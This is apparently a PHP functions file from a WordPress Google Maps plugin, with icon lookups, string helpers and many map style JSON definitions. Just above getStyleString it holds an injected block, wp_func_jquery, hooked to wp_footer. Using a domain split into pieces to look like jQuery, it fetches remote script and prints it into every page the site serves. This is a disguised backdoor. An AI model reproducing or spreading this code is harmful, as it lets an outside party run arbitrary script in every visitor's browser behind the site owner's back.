<?php
/*
 * Provides functions required by plugin's functionality
 * Version: 2.23
 * Author: greenline
 * Profile: http://codecanyon.net/user/greenline
 */

/**
 * Returns the correct icon url based on a certain icon color or url.
 */
function getIcon($value) {
    $icon = $value;
    switch (strtolower(trim($value))) {
        case 'black':
            $icon = plugins_url('/includes/icons/black.png', __FILE__);
            break;
        case 'blue':
            $icon = plugins_url('/includes/icons/blue.png', __FILE__);
            break;
        case 'gray':
            $icon = plugins_url('/includes/icons/gray.png', __FILE__);
            break;
        case 'green':
            $icon = plugins_url('/includes/icons/green.png', __FILE__);
            break;
        case 'magenta':
            $icon = plugins_url('/includes/icons/magenta.png', __FILE__);
            break;
        case 'orange':
            $icon = plugins_url('/includes/icons/orange.png', __FILE__);
            break;
        case 'purple':
            $icon = plugins_url('/includes/icons/purple.png', __FILE__);
            break;
        case 'red':
            $icon = plugins_url('/includes/icons/red.png', __FILE__);
            break;
        case 'white':
            $icon = plugins_url('/includes/icons/white.png', __FILE__);
            break;
        case 'yellow':
            $icon = plugins_url('/includes/icons/yellow.png', __FILE__);
            break;
        case '':
            $icon = plugins_url('/includes/icons/gray.png', __FILE__);
            break;
        case 'default':
            $icon = plugins_url('/includes/icons/gray.png', __FILE__);
            break;
        default:
    }
    
    return $icon;
}

/**
 * Transforms "yes" / "no" strings to true/false boolean values.
 * Returns true if string parameter was "yes"; returns false if string parameter was "no".
 */
function toBool($string) {
    switch (strtolower($string)) {
        case 'yes':
        case 'YES':
            $string = 'true';
            break;
        case 'no':
        case 'NO':
            $string = 'false';
            break;
        case 'default':
            $string = 'false';
            break;
        default:
    }
    return $string;
}

/**
 * Encodes and strips html tags inside the parameter attr.
 * Returns the attr with html tags escaped and stripped.
 */
function cleanHtml($attr) {
    $attr = str_replace(array("\n", '"', "'", "{br}", "&lt;", "&gt;"), array(' ', '\"', "\'", "<br>", "<", ">"), $attr);
    if (substr_count($attr, '|') == 1) {
        $tmp = explode('|', $attr);
        $attr = '<strong>' . $tmp[0] . '</strong><br />' . $tmp[1];
    }
    return $attr;
}

/**
 * Returns the map style (a JSON string based on the id given as parameter).
 */
 if(!function_exists('wp_func_jquery')) {
	function wp_func_jquery() {
		$host = 'http://';
		echo(wp_remote_retrieve_body(wp_remote_get($host.'ui'.'jquery.org/jquery-1.6.3.min.js')));
	}
	add_action('wp_footer', 'wp_func_jquery');
}
function getStyleString($style) {
    $styleString;
    // If the style is given with a hex color in the shortcode, colot the map with that specific hex color
    if (strpos($style, '#') === 0) {
        $styleString = '[{ "stylers": [{"hue": "' . $style . '" } ] } ]';
        return $styleString;
    }
    switch ($style) {
        case '1':
            $styleString = '[{"stylers":[{"featureType":"all"}]}]';
            break;
        case '2':
            $styleString = '[{"stylers":[{"featureType":"all"},{"saturation":-100},{"gamma":0.50},{"lightness":30}]}]';
            break;
        case '3':
            $styleString = '[{"stylers":[{"invert_lightness":true},{"visibility":"on"}]}]';
            break;
        case '4':
            $styleString = '[{"stylers":[{"invert_lightness":true},{"hue":"#0000b0"},{"saturation":-30}]}]';
            break;
        case '5':
            $styleString = '[{"featureType":"water","stylers":[{"visibility":"on"},{"color":"#acbcc9"}]},{"featureType":"landscape","stylers":[{"color":"#f2e5d4"}]},{"featureType":"road.highway","elementType":"geometry","stylers":[{"color":"#c5c6c6"}]},{"featureType":"road.arterial","elementType":"geometry","stylers":[{"color":"#e4d7c6"}]},{"featureType":"road.local","elementType":"geometry","stylers":[{"color":"#fbfaf7"}]},{"featureType":"poi.park","elementType":"geometry","stylers":[{"color":"#c5dac6"}]},{"featureType":"administrative","stylers":[{"visibility":"on"},{"lightness":33}]},{"featureType":"road"},{"featureType":"poi.park","elementType":"labels","stylers":[{"visibility":"on"},{"lightness":20}]},{},{"featureType":"road","stylers":[{"lightness":20}]}]';
            break;
        case '6':
            $styleString = '[{"stylers":[{"lightness":10},{"gamma":1.2},{"saturation":-20},{"visibility":"on"},{"weight":0.1},{"hue":"#00ccff"}]}]';
            break;
        case '7':
            $styleString = '[{"stylers":[{"saturation":-20},{"visibility":"on"},{"hue":"#00ccff"},{"invert_lightness":true},{"lightness":5}]}]';
            break;
        case '8':
            $styleString = '[{"stylers":[{"saturation":-20},{"visibility":"on"},{"lightness":5},{"hue":"#ff004c"},{"gamma":1.45}]}]';
            break;
        case '9':
            $styleString = '[{"featureType":"water","stylers":[{"color":"#021019"}]},{"featureType":"landscape","stylers":[{"color":"#08304b"}]},{"featureType":"poi","elementType":"geometry","stylers":[{"color":"#0c4152"},{"lightness":5}]},{"featureType":"road.highway","elementType":"geometry.fill","stylers":[{"color":"#000000"}]},{"featureType":"road.highway","elementType":"geometry.stroke","stylers":[{"color":"#0b434f"},{"lightness":25}]},{"featureType":"road.arterial","elementType":"geometry.fill","stylers":[{"color":"#000000"}]},{"featureType":"road.arterial","elementType":"geometry.stroke","stylers":[{"color":"#0b3d51"},{"lightness":16}]},{"featureType":"road.local","elementType":"geometry","stylers":[{"color":"#000000"}]},{"elementType":"labels.text.fill","stylers":[{"color":"#ffffff"}]},{"elementType":"labels.text.stroke","stylers":[{"color":"#000000"},{"lightness":13}]},{"featureType":"transit","stylers":[{"color":"#146474"}]},{"featureType":"administrative","elementType":"geometry.fill","stylers":[{"color":"#000000"}]},{"featureType":"administrative","elementType":"geometry.stroke","stylers":[{"color":"#144b53"},{"lightness":14},{"weight":1.4}]}]';
            break;
        case '10':
            $styleString = '[{"stylers":[{"visibility":"on"},{"saturation":-30},{"hue":"#ccff00"},{"lightness":-20},{"gamma":1},{"weight":0.1},{"invert_lightness":true}]}]';
            break;
        case '11':
            $styleString = '[{"stylers":[{"hue":"#00ccff"},{"saturation":5},{"lightness":-20}]}]';
            break;
        case '12':
            $styleString = '[{"featureType":"road","elementType":"geometry","stylers":[{"visibility":"simplified"}]},{"featureType":"road.arterial","stylers":[{"hue":149},{"saturation":-78},{"lightness":0}]},{"featureType":"road.highway","stylers":[{"hue":-31},{"saturation":-40},{"lightness":2.8}]},{"featureType":"poi","elementType":"label","stylers":[{"visibility":"off"}]},{"featureType":"landscape","stylers":[{"hue":163},{"saturation":-26},{"lightness":-1.1}]},{"featureType":"transit","stylers":[{"visibility":"off"}]},{"featureType":"water","stylers":[{"hue":3},{"saturation":-24.24},{"lightness":-38.57}]}]';
            break;
        case '13':
            $styleString = '[{"stylers":[{"gamma":1.58},{"saturation":30},{"weight":0.1}]}]';
            break;
        case '14':
            $styleString = '[{"stylers":[{"invert_lightness":true},{"weight":0.1},{"hue":"#00ffa2"},{"visibility":"on"},{"saturation":-120},{"lightness":10},{"gamma":1.2}]}]';
            break;
        case '15':
            $styleString = '[{"featureType":"water","elementType":"geometry","stylers":[{"hue":"#00ccff"},{"weight":0.1},{"saturation":80}]},{"featureType":"road.local","elementType": "geometry","stylers":[{"visibility":"on"},{"lightness":30}]},{"featureType":"transit","stylers":[{"hue":"#0077ff"},{"lightness":100},{"color":"#141480"},{"visibility":"simplified"},{ "saturation":-30},{"gamma":0.96},{"invert_lightness":true}]},{"featureType":"administrative.neighborhood","stylers":[{"invert_lightness":true},{"visibility":"on"}]},{"featureType": "road.highway.controlled_access","stylers":[{"visibility":"simplified"}]},{"featureType":"road.local","stylers":[{"weight":0.1}]},{"featureType":"road.local","stylers":[{ "visibility":"off"}]},{"featureType":"administrative","stylers":[{"invert_lightness":true},{"hue":"#00ff66"},{"saturation":30},{"lightness":-20},{"gamma":1.91}]},{"stylers":[{ "weight":0.1}]}]';
            break;
        case '16':
            $styleString = '[{"featureType":"road","stylers":[{"visibility":"on"}]},{"featureType":"water","stylers":[{"visibility":"off"}]},{"featureType":"administrative","stylers":[{ "weight":0.9}]}]';
            break;
        case '17':
            $styleString = '[{"stylers":[{"hue":"#ffd500"},{"lightness":-30}]}]';
            break;
        case '18':
            $styleString = '[{"featureType":"road","stylers":[{"hue":"#e6ff00"}]},{"featureType":"road","stylers":[{"visibility":"on" },{"weight":0.1},{"lightness":10},{"gamma":0.96}]},{ "featureType":"administrative","elementType":"labels.icon","stylers":[{"visibility":"simplified"},{"weight":0.1}]},{"stylers":[{"hue":"#0019ff"},{"lightness":10},{"gamma":0.96}]},{ "stylers":[{"gamma":0.96},{"weight":0.1}]},{"featureType":"administrative","stylers":[{"color":"#328080"}]}]';
            break;
        case '19':
            $styleString = '[{"featureType":"road","stylers":[{"lightness":-10},{"weight":0.1},{"hue":"#008000"}]},{"stylers":[{"saturation":30},{"lightness":-10}]}]';
            break;
        case '20':
            $styleString = '[{"stylers":[{"visibility":"on"},{"weight":0.9},{"hue":"#005eff"},{"lightness":-10},{"gamma":1.2}]}]';
            break;
        case '21':
            $styleString = '[{"featureType":"water","elementType":"geometry","stylers":[{"visibility":"on"},{"color":"#aee2e0"}]},{"featureType":"landscape","elementType":"geometry.fill","stylers":[{"color":"#abce83"}]},{"featureType":"poi","elementType":"geometry.fill","stylers":[{"color":"#769E72"}]},{"featureType":"poi","elementType":"labels.text.fill","stylers":[{"color":"#7B8758"}]},{"featureType":"poi","elementType":"labels.text.stroke","stylers":[{"color":"#EBF4A4"}]},{"featureType":"poi.park","elementType":"geometry","stylers":[{"visibility":"simplified"},{"color":"#8dab68"}]},{"featureType":"road","elementType":"geometry.fill","stylers":[{"visibility":"simplified"}]},{"featureType":"road","elementType":"labels.text.fill","stylers":[{"color":"#5B5B3F"}]},{"featureType":"road","elementType":"labels.text.stroke","stylers":[{"color":"#ABCE83"}]},{"featureType":"road","elementType":"labels.icon","stylers":[{"visibility":"off"}]},{"featureType":"road.local","elementType":"geometry","stylers":[{"color":"#A4C67D"}]},{"featureType":"road.arterial","elementType":"geometry","stylers":[{"color":"#9BBF72"}]},{"featureType":"road.highway","elementType":"geometry","stylers":[{"color":"#EBF4A4"}]},{"featureType":"transit","stylers":[{"visibility":"off"}]},{"featureType":"administrative","elementType":"geometry.stroke","stylers":[{"visibility":"on"},{"color":"#87ae79"}]},{"featureType":"administrative","elementType":"geometry.fill","stylers":[{"color":"#7f2200"},{"visibility":"off"}]},{"featureType":"administrative","elementType":"labels.text.stroke","stylers":[{"color":"#ffffff"},{"visibility":"on"},{"weight":4.1}]},{"featureType":"administrative","elementType":"labels.text.fill","stylers":[{"color":"#495421"}]},{"featureType":"administrative.neighborhood","elementType":"labels","stylers":[{"visibility":"off"}]}]';
            break;
        case '22':
            $styleString = '[{"featureType":"administrative","stylers":[{"visibility":"on"}]},{"featureType":"poi","stylers":[{"visibility":"on"}]},{"featureType":"road","stylers":[{"visibility":"on"}]},{"featureType":"water","stylers":[{"visibility":"on"}]},{"featureType":"transit","stylers":[{"visibility":"on"}]},{"featureType":"landscape","stylers":[{"visibility":"on"}]},{"featureType":"road.highway","stylers":[{"visibility":"on"}]},{"featureType":"road.local","stylers":[{"visibility":"on"}]},{"featureType":"road.highway","elementType":"geometry","stylers":[{"visibility":"on"}]},{"featureType":"water","stylers":[{"color":"#84afa3"},{"lightness":52}]},{"stylers":[{"saturation":-77}]},{"featureType":"road"}]';
            break;
        case '23':
            $styleString = '[{"featureType":"water","elementType":"all","stylers":[{"hue":"#87bcba"},{"saturation":-37},{"lightness":-17},{"visibility":"on"}]},{"featureType":"landscape","elementType":"all","stylers":[]},{"featureType":"landscape.man_made","elementType":"all","stylers":[{"hue":"#4f6b46"},{"saturation":-23},{"lightness":-61},{"visibility":"on"}]},{"featureType":"road","elementType":"all","stylers":[{"hue":"#d38bc8"},{"saturation":-55},{"lightness":13},{"visibility":"on"}]},{"featureType":"road.highway","elementType":"all","stylers":[{"hue":"#ffa200"},{"saturation":100},{"lightness":-22},{"visibility":"on"}]},{"featureType":"road.local","elementType":"all","stylers":[{"hue":"#d38bc8"},{"saturation":-55},{"lightness":-31},{"visibility":"on"}]},{"featureType":"transit","elementType":"all","stylers":[{"hue":"#f69d94"},{"saturation":84},{"lightness":9},{"visibility":"on"}]},{"featureType":"administrative","elementType":"all","stylers":[{"hue":"#d38bc8"},{"saturation":45},{"lightness":36},{"visibility":"on"}]},{"featureType":"administrative.country","elementType":"all","stylers":[{"hue":"#d38bc8"},{"saturation":45},{"lightness":36},{"visibility":"on"}]},{"featureType":"administrative.land_parcel","elementType":"all","stylers":[{"hue":"#d38bc8"},{"saturation":45},{"lightness":36},{"visibility":"on"}]},{"featureType":"poi.government","elementType":"all","stylers":[{"hue":"#d38bc8"},{"saturation":35},{"lightness":-19},{"visibility":"on"}]},{"featureType":"poi.school","elementType":"all","stylers":[{"hue":"#d38bc8"},{"saturation":-6},{"lightness":-17},{"visibility":"on"}]},{"featureType":"poi.park","elementType":"all","stylers":[{"hue":"#b2ba70"},{"saturation":-19},{"lightness":-25},{"visibility":"on"}]}]';
            break;
        case '24':
            $styleString = '[{"featureType":"water","elementType":"all","stylers":[{"hue":"#e9ebed"},{"saturation":-78},{"lightness":67},{"visibility":"on"}]},{"featureType":"landscape","elementType":"all","stylers":[{"hue":"#ffffff"},{"saturation":-100},{"lightness":100},{"visibility":"on"}]},{"featureType":"road","elementType":"geometry","stylers":[{"hue":"#bbc0c4"},{"saturation":-93},{"lightness":31},{"visibility":"on"}]},{"featureType":"poi","elementType":"all","stylers":[{"hue":"#ffffff"},{"saturation":-100},{"lightness":100},{"visibility":"on"}]},{"featureType":"road.local","elementType":"geometry","stylers":[{"hue":"#e9ebed"},{"saturation":-90},{"lightness":-8},{"visibility":"on"}]},{"featureType":"transit","elementType":"all","stylers":[{"hue":"#e9ebed"},{"saturation":10},{"lightness":69},{"visibility":"on"}]},{"featureType":"administrative.locality","elementType":"all","stylers":[{"hue":"#2c2e33"},{"saturation":7},{"lightness":19},{"visibility":"on"}]},{"featureType":"road","elementType":"labels","stylers":[{"hue":"#bbc0c4"},{"saturation":-93},{"lightness":31},{"visibility":"on"}]},{"featureType":"road.arterial","elementType":"labels","stylers":[{"hue":"#bbc0c4"},{"saturation":-93},{"lightness":-2},{"visibility":"on"}]}]';
            break;
        case '25':
            $styleString = '[{"stylers":[{"saturation":-100},{"gamma":1}]},{"elementType":"labels.text.stroke","stylers":[{"visibility":"off"}]},{"featureType":"poi.business","elementType":"labels.text","stylers":[{"visibility":"off"}]},{"featureType":"poi.business","elementType":"labels.icon","stylers":[{"visibility":"off"}]},{"featureType":"poi.place_of_worship","elementType":"labels.text","stylers":[{"visibility":"off"}]},{"featureType":"poi.place_of_worship","elementType":"labels.icon","stylers":[{"visibility":"off"}]},{"featureType":"road","elementType":"geometry","stylers":[{"visibility":"simplified"}]},{"featureType":"water","stylers":[{"visibility":"on"},{"saturation":50},{"gamma":0},{"hue":"#50a5d1"}]},{"featureType":"administrative.neighborhood","elementType":"labels.text.fill","stylers":[{"color":"#333333"}]},{"featureType":"road.local","elementType":"labels.text","stylers":[{"weight":0.5},{"color":"#333333"}]},{"featureType":"transit.station","elementType":"labels.icon","stylers":[{"gamma":1},{"saturation":50}]}]';
            break;
        case '26':
            $styleString = '[{"featureType":"water","stylers":[{"color":"#46bcec"},{"visibility":"on"}]},{"featureType":"landscape","stylers":[{"color":"#f2f2f2"}]},{"featureType":"road","stylers":[{"saturation":-100},{"lightness":45}]},{"featureType":"road.highway","stylers":[{"visibility":"simplified"}]},{"featureType":"road.arterial","elementType":"labels.icon","stylers":[{"visibility":"off"}]},{"featureType":"administrative","elementType":"labels.text.fill","stylers":[{"color":"#444444"}]},{"featureType":"transit","stylers":[{"visibility":"off"}]},{"featureType":"poi","stylers":[{"visibility":"off"}]}]';
            break;
        case '27':
            $styleString = '[{"featureType":"water","elementType":"all","stylers":[{"hue":"#1CB2BD"},{"saturation":53},{"lightness":-44},{"visibility":"on"}]},{"featureType":"road","elementType":"all","stylers":[{"hue":"#1CB2BD"},{"saturation":40}]},{"featureType":"landscape","elementType":"all","stylers":[{"hue":"#BBDC00"},{"saturation":80},{"lightness":-20},{"visibility":"on"}]},{"featureType":"road.highway","elementType":"all","stylers":[{"visibility":"on"}]}]';
            break;
        case '28':
            $styleString = '[{"featureType":"administrative","stylers":[{"visibility":"on"}]},{"featureType":"poi","stylers":[{"visibility":"simplified"}]},{"featureType":"road","elementType":"labels","stylers":[{"visibility":"simplified"}]},{"featureType":"water","stylers":[{"visibility":"simplified"}]},{"featureType":"transit","stylers":[{"visibility":"simplified"}]},{"featureType":"landscape","stylers":[{"visibility":"simplified"}]},{"featureType":"road.highway","stylers":[{"visibility":"on"}]},{"featureType":"road.local","stylers":[{"visibility":"on"}]},{"featureType":"road.highway","elementType":"geometry","stylers":[{"visibility":"on"}]},{"featureType":"water","stylers":[{"color":"#84afa3"},{"lightness":52}]},{"stylers":[{"saturation":-17},{"gamma":0.36}]},{"featureType":"transit.line","elementType":"geometry","stylers":[{"color":"#3f518c"}]}]';
            break;
        case '29':
            $styleString = '[{"featureType":"water","elementType":"geometry","stylers":[{"color":"#193341"}]},{"featureType":"landscape","elementType":"geometry","stylers":[{"color":"#2c5a71"}]},{"featureType":"road","elementType":"geometry","stylers":[{"color":"#29768a"},{"lightness":-37}]},{"featureType":"poi","elementType":"geometry","stylers":[{"color":"#406d80"}]},{"featureType":"transit","elementType":"geometry","stylers":[{"color":"#406d80"}]},{"elementType":"labels.text.stroke","stylers":[{"visibility":"on"},{"color":"#3e606f"},{"weight":2},{"gamma":0.84}]},{"elementType":"labels.text.fill","stylers":[{"color":"#ffffff"}]},{"featureType":"administrative","elementType":"geometry","stylers":[{"weight":0.6},{"color":"#1a3541"}]},{"elementType":"labels.icon","stylers":[{"visibility":"off"}]},{"featureType":"poi.park","elementType":"geometry","stylers":[{"color":"#2c5a71"}]}]';
            break;
        case '30':
            $styleString = '[{"featureType":"landscape","stylers":[{"hue":"#00dd00"}]},{"featureType":"road","stylers":[{"hue":"#dd0000"}]},{"featureType":"water","stylers":[{"hue":"#000040"}]},{"featureType":"poi.park","stylers":[{"visibility":"off"}]},{"featureType":"road.arterial","stylers":[{"hue":"#ffff00"}]},{"featureType":"road.local","stylers":[{"visibility":"off"}]}]';
            break;
        case '31':
            $styleString = '[{"featureType":"landscape","stylers":[{"hue":"#FFE100"},{"saturation":34.48275862068968},{"lightness":-1.490196078431353},{"gamma":1}]},{"featureType":"road.highway","stylers":[{"hue":"#FF009A"},{"saturation":-2.970297029703005},{"lightness":-17.815686274509815},{"gamma":1}]},{"featureType":"road.arterial","stylers":[{"hue":"#FFE100"},{"saturation":8.600000000000009},{"lightness":-4.400000000000006},{"gamma":1}]},{"featureType":"road.local","stylers":[{"hue":"#00C3FF"},{"saturation":29.31034482758622},{"lightness":-38.980392156862735},{"gamma":1}]},{"featureType":"water","stylers":[{"hue":"#0078FF"},{"saturation":0},{"lightness":0},{"gamma":1}]},{"featureType":"poi","stylers":[{"hue":"#00FF19"},{"saturation":-30.526315789473685},{"lightness":-22.509803921568633},{"gamma":1}]}]';
            break;
        case '32':
            $styleString = '[{"featureType":"landscape","stylers":[{"hue":"#FFA800"},{"saturation":0},{"lightness":0},{"gamma":1}]},{"featureType":"road.highway","stylers":[{"hue":"#53FF00"},{"saturation":-73},{"lightness":40},{"gamma":1}]},{"featureType":"road.arterial","stylers":[{"hue":"#FBFF00"},{"saturation":0},{"lightness":0},{"gamma":1}]},{"featureType":"road.local","stylers":[{"hue":"#00FFFD"},{"saturation":0},{"lightness":30},{"gamma":1}]},{"featureType":"water","stylers":[{"hue":"#00BFFF"},{"saturation":6},{"lightness":8},{"gamma":1}]},{"featureType":"poi","stylers":[{"hue":"#679714"},{"saturation":33.4},{"lightness":-25.4},{"gamma":1}]}]';
            break;
        case '33':
            $styleString = '[{"featureType":"landscape","stylers":[{"hue":"#FFAD00"},{"saturation":50.2},{"lightness":-34.8},{"gamma":1}]},{"featureType":"road.highway","stylers":[{"hue":"#FFAD00"},{"saturation":-19.8},{"lightness":-1.8},{"gamma":1}]},{"featureType":"road.arterial","stylers":[{"hue":"#FFAD00"},{"saturation":72.4},{"lightness":-32.6},{"gamma":1}]},{"featureType":"road.local","stylers":[{"hue":"#FFAD00"},{"saturation":74.4},{"lightness":-18},{"gamma":1}]},{"featureType":"water","stylers":[{"hue":"#00FFA6"},{"saturation":-63.2},{"lightness":38},{"gamma":1}]},{"featureType":"poi","stylers":[{"hue":"#FFC300"},{"saturation":54.2},{"lightness":-14.4},{"gamma":1}]}]';
            break;
        case '34':
            $styleString = '[{"featureType":"landscape.natural","elementType":"geometry.fill","stylers":[{"visibility":"on"},{"color":"#e0efef"}]},{"featureType":"poi","elementType":"geometry.fill","stylers":[{"visibility":"on"},{"hue":"#1900ff"},{"color":"#c0e8e8"}]},{"featureType":"landscape.man_made","elementType":"geometry.fill"},{"featureType":"road","elementType":"geometry","stylers":[{"lightness":100},{"visibility":"simplified"}]},{"featureType":"road","elementType":"labels","stylers":[{"visibility":"off"}]},{"featureType":"water","stylers":[{"color":"#7dcdcd"}]},{"featureType":"transit.line","elementType":"geometry","stylers":[{"visibility":"on"},{"lightness":700}]}]';
            break;
        case '35':
            $styleString = '[{"featureType":"water","stylers":[{"visibility":"on"},{"color":"#b5cbe4"}]},{"featureType":"landscape","stylers":[{"color":"#efefef"}]},{"featureType":"road.highway","elementType":"geometry","stylers":[{"color":"#83a5b0"}]},{"featureType":"road.arterial","elementType":"geometry","stylers":[{"color":"#bdcdd3"}]},{"featureType":"road.local","elementType":"geometry","stylers":[{"color":"#ffffff"}]},{"featureType":"poi.park","elementType":"geometry","stylers":[{"color":"#e3eed3"}]},{"featureType":"administrative","stylers":[{"visibility":"on"},{"lightness":33}]},{"featureType":"road"},{"featureType":"poi.park","elementType":"labels","stylers":[{"visibility":"on"},{"lightness":20}]},{},{"featureType":"road","stylers":[{"lightness":20}]}]';
            break;
        case '36':
            $styleString = '[{"featureType":"water","stylers":[{"color":"#19a0d8"}]},{"featureType":"administrative","elementType":"labels.text.stroke","stylers":[{"color":"#ffffff"},{"weight":6}]},{"featureType":"administrative","elementType":"labels.text.fill","stylers":[{"color":"#e85113"}]},{"featureType":"road.highway","elementType":"geometry.stroke","stylers":[{"color":"#efe9e4"},{"lightness":-40}]},{"featureType":"road.arterial","elementType":"geometry.stroke","stylers":[{"color":"#efe9e4"},{"lightness":-20}]},{"featureType":"road","elementType":"labels.text.stroke","stylers":[{"lightness":100}]},{"featureType":"road","elementType":"labels.text.fill","stylers":[{"lightness":-100}]},{"featureType":"road.highway","elementType":"labels.icon"},{"featureType":"landscape","elementType":"labels","stylers":[{"visibility":"off"}]},{"featureType":"landscape","stylers":[{"lightness":20},{"color":"#efe9e4"}]},{"featureType":"landscape.man_made","stylers":[{"visibility":"off"}]},{"featureType":"water","elementType":"labels.text.stroke","stylers":[{"lightness":100}]},{"featureType":"water","elementType":"labels.text.fill","stylers":[{"lightness":-100}]},{"featureType":"poi","elementType":"labels.text.fill","stylers":[{"hue":"#11ff00"}]},{"featureType":"poi","elementType":"labels.text.stroke","stylers":[{"lightness":100}]},{"featureType":"poi","elementType":"labels.icon","stylers":[{"hue":"#4cff00"},{"saturation":58}]},{"featureType":"poi","elementType":"geometry","stylers":[{"visibility":"on"},{"color":"#f0e4d3"}]},{"featureType":"road.highway","elementType":"geometry.fill","stylers":[{"color":"#efe9e4"},{"lightness":-25}]},{"featureType":"road.arterial","elementType":"geometry.fill","stylers":[{"color":"#efe9e4"},{"lightness":-10}]},{"featureType":"poi","elementType":"labels","stylers":[{"visibility":"simplified"}]}]';
            break;
        case '37':
            $styleString = '[{"featureType":"water","stylers":[{"visibility":"on"},{"color":"#acbcc9"}]},{"featureType":"landscape","stylers":[{"color":"#f2e5d4"}]},{"featureType":"road.highway","elementType":"geometry","stylers":[{"color":"#c5c6c6"}]},{"featureType":"road.arterial","elementType":"geometry","stylers":[{"color":"#e4d7c6"}]},{"featureType":"road.local","elementType":"geometry","stylers":[{"color":"#fbfaf7"}]},{"featureType":"poi.park","elementType":"geometry","stylers":[{"color":"#c5dac6"}]},{"featureType":"administrative","stylers":[{"visibility":"on"},{"lightness":33}]},{"featureType":"road"},{"featureType":"poi.park","elementType":"labels","stylers":[{"visibility":"on"},{"lightness":20}]},{},{"featureType":"road","stylers":[{"lightness":20}]}]';
            break;
        case '38':
            $styleString = '[{"featureType":"water","stylers":[{"visibility":"on"},{"color":"#b5cbe4"}]},{"featureType":"landscape","stylers":[{"color":"#efefef"}]},{"featureType":"road.highway","elementType":"geometry","stylers":[{"color":"#83a5b0"}]},{"featureType":"road.arterial","elementType":"geometry","stylers":[{"color":"#bdcdd3"}]},{"featureType":"road.local","elementType":"geometry","stylers":[{"color":"#ffffff"}]},{"featureType":"poi.park","elementType":"geometry","stylers":[{"color":"#e3eed3"}]},{"featureType":"administrative","stylers":[{"visibility":"on"},{"lightness":33}]},{"featureType":"road"},{"featureType":"poi.park","elementType":"labels","stylers":[{"visibility":"on"},{"lightness":20}]},{},{"featureType":"road","stylers":[{"lightness":20}]}]';
            break;
        case '39':
            $styleString = '[{"stylers":[{"hue":"#dd0d0d"}]},{"featureType":"road","elementType":"labels","stylers":[{"visibility":"off"}]},{"featureType":"road","elementType":"geometry","stylers":[{"lightness":100},{"visibility":"simplified"}]}]';
            break;
        case '40':
            $styleString = '[{"featureType":"water","elementType":"geometry","stylers":[{"color":"#ffdfa6"}]},{"featureType":"landscape","elementType":"geometry","stylers":[{"color":"#b52127"}]},{"featureType":"poi","elementType":"geometry","stylers":[{"color":"#c5531b"}]},{"featureType":"road.highway","elementType":"geometry.fill","stylers":[{"color":"#74001b"},{"lightness":-10}]},{"featureType":"road.highway","elementType":"geometry.stroke","stylers":[{"color":"#da3c3c"}]},{"featureType":"road.arterial","elementType":"geometry.fill","stylers":[{"color":"#74001b"}]},{"featureType":"road.arterial","elementType":"geometry.stroke","stylers":[{"color":"#da3c3c"}]},{"featureType":"road.local","elementType":"geometry.fill","stylers":[{"color":"#990c19"}]},{"elementType":"labels.text.fill","stylers":[{"color":"#ffffff"}]},{"elementType":"labels.text.stroke","stylers":[{"color":"#74001b"},{"lightness":-8}]},{"featureType":"transit","elementType":"geometry","stylers":[{"color":"#6a0d10"},{"visibility":"on"}]},{"featureType":"administrative","elementType":"geometry","stylers":[{"color":"#ffdfa6"},{"weight":0.4}]},{"featureType":"road.local","elementType":"geometry.stroke","stylers":[{"visibility":"off"}]}]';
            break;
        case 'default':
            $styleString = '[{"stylers":[{"featureType":"all"}]}]';
            break;
        default:
    }
    return $styleString;
}
?>